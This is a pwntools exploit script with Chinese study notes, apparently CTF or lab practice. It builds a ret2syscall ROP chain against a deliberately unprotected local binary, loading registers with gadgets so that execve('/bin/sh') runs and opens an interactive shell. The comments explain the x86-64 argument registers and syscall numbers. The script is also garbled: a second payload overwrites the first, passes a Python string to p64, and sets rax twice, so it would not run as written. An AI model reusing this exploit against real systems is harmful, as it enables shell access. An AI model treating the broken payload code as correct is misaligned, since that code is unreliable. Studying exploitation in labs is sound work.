# gcc -static -o ret2syscall ret2syscall.c -no-pie -fno-stack-protector

from pwn import *		
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './ret2syscall'
io=process(pwnfile)	# ,aslr = False


bin_sh = 0x4C60F0	          #找字符串

# ROPgadget --binary  ./ret2syscall --only "pop|ret|rax" | grep "rax"
# ROPgadget --binary  ./ret2syscall --only "pop|ret|rdi" | grep "rdi"
# ROPgadget --binary  ./ret2syscall --only "pop|ret|rsi" | grep "rsi"
# ROPgadget --binary  ./ret2syscall --only "pop|ret|rdx" | grep "rdx"
# ROPgadget --binary  ./ret2syscall --only "pop|ret|rdx" | grep "rdx"
pop_rax = 0x0000000000450087   #0x0000000000485eaa
pop_rdi = 0x0000000000401f2f  # 
pop_rsi = 0x0000000000409f5e
pop_rdx_rbx = 0x0000000000485eab
syscall = 0x0000000000401ce4  # 41AA99 0x0000000000401ce4

# 0x0000000000485eaa : pop rax ; pop rdx ; pop rbx ; ret
# 

#32


#32位的程序是用栈来传参数       栈上
#64位的程序是用寄存器来传参数   pop rdi  pop rsi	pop rdx  pop rbx  pop rcx  pop r8  pop r9



offest = 8
pay = b'a'*offest  + b'a'*8  
pay += p64(pop_rdi) +p64(bin_sh)
pay += p64(pop_rsi) +p64(0)
pay += p64(pop_rdx_rbx) + p64(0)+ p64(0)
pay += p64(pop_rax) +p64(59)
pay += p64(syscall)
#execve("/bin/sh",0,0)

#32位程序 4个字节
bin_sh = "sh\x00\x00"

#system()  其实最终包裹的是execve(,0,0)  system(sh )-> execve("sh",0,0)

#execve("/bin/sh",0,0)
#位一个程序变量8个字节
bin_sh = "/bin/sh\x00"  #64位程序构造8字节
pop_rax_rdx_rbx = 0x0000000000485eaa
offest = 8
pay = b'a'*offest  + b'a'*8  
pay += p64(pop_rdi) +p64(bin_sh)
pay += p64(pop_rsi) +p64(0)
pay += p64(pop_rax_rdx_rbx) + p64(59)+ p64(0)+ p64(0)
pay += p64(pop_rax) +p64(59)
pay += p64(syscall)


io.sendline(pay) #发送数据，不需要改
io.interactive()



#函数传参数
# func(arg1,arg2,arg3,arg4,arg5)
# arg1 寄存器 rdi
# arg2 寄存器 rsi
# arg3 寄存器 rdx

#rdi 需要值才可以调用函数 
#汇编指令  pop rdi  pop rsi	pop rdx  pop rbx  pop rcx  pop r8  pop r9

#找什么函数：
# syscall     是linux的汇编代码   syscall 特点 他可以通过rax寄存来调用任意函数
#system C语言函数 是C
#execute C语言函数 是C


# syscall -》 execute   就需要把rax改成59
#linux系统原理

# syscall rax =0          调用read函数
# syscall rax =1          调用write函数
# syscall rax =2          调用open函数

# syscall 
# syscall execute  rax=59  调用execute函数-》system函数 名字不一样

#工具： pip install ROPgadget
# 0x0000000000450087 : pop rax ; ret
# 0x0000000000401f2f : pop rdi ; ret
# 0x0000000000409f5e : pop rsi ; ret
# 0x0000000000485eab : pop rdx ; pop rbx ; ret
# 0x0000000000485eab : pop rdx ; ret






#系统调用号

# syscall   rax   system("/bin/sh")
#syscall(59,'/bin/sh',0,0) 	execve('/bin/sh',NULL,NULL)


#1.寄存器传参的汇编指令
# pop rdi  pop rsi	pop rdx  pop rbx  pop rcx  pop r8  pop r9
#



#system


# "aaa "
# b'a'     

# 函数的传参规则
# rdi、rsi、rdx、rcx、r8、r9
# p64   p64( 0x401f2f)# 0x00 00 00 00 00 40 1f 2f   p64(0)  00 00 00 00 00 00 00 00

#system（bin/sh）
# 